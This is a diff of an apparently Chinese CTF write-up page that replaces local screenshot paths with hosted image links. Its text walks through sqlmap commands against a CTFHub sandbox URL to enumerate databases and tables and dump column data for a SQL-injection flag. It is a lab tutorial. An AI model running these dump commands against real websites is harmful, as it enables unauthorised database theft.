@@ -102,13 +102,13 @@
 <p>eg:<a target="_blank" rel="noopener" href="http://challenge-16d2f4968e269cfb.sandbox.ctfhub.com:10800/,%E8%BF%99%E7%A7%8D%EF%BC%8C%E6%BC%8FNO">http://challenge-16d2f4968e269cfb.sandbox.ctfhub.com:10800/,这种，漏NO</a></p>
 <p>eg:<a target="_blank" rel="noopener" href="http://challenge-16d2f4968e269cfb.sandbox.ctfhub.com:10800/?id=1%EF%BC%8C%E8%BF%99%E7%A7%8D%EF%BC%8CYES">http://challenge-16d2f4968e269cfb.sandbox.ctfhub.com:10800/?id=1，这种，YES</a></p>
 <p>这里有数据库的相关信息，如图：</p>
-<p><img src="C:\Users\happy\OneDrive\图片\屏幕快照\Screenshot_2022-04-09_10_29_23.png"></p>
+<p><img src="https://img.le1a.com/2022/04/09/9c38ddf4c4bf6.png"></p>
 <p><strong>sqlmap -u “url” –dbs –batch</strong></p>
 <p>输入指令，看它提供的数据库名称</p>
-<p><img src="C:\Users\happy\OneDrive\图片\屏幕快照\Screenshot_2022-04-09_11_10_46.png"></p>
+<p><img src="https://img.le1a.com/2022/04/09/b0d432090354b.png"></p>
 <p>看打*部分可知，数据库为 sqli</p>
 <p>-D这个参数是用来进入数据库的，通常要配合–tables使用（语法）<br>$$<br>sqlmap -u “url” –dbs -D 数据库名称 –tables –batch<br>$$<br>–tables 这个参数是用来显示当前数据库的表（就是这个命令）</p>
-<p><img src="C:\Users\happy\OneDrive\图片\屏幕快照\Screenshot_2022-04-09_11_14_03.png"><br>$$<br><strong>sqlmap -u “url” –dbs -D 数据库名称 –tables -T 表名 –columns –dump –batch</strong><br>$$<br>–dump是导出</p>
+<p><img src="https://img.le1a.com/2022/04/09/b65ba15583869.png"><br>$$<br><strong>sqlmap -u “url” –dbs -D 数据库名称 –tables -T 表名 –columns –dump –batch</strong><br>$$<br>–dump是导出</p>
 <p>即可获得flag</p>
 
       
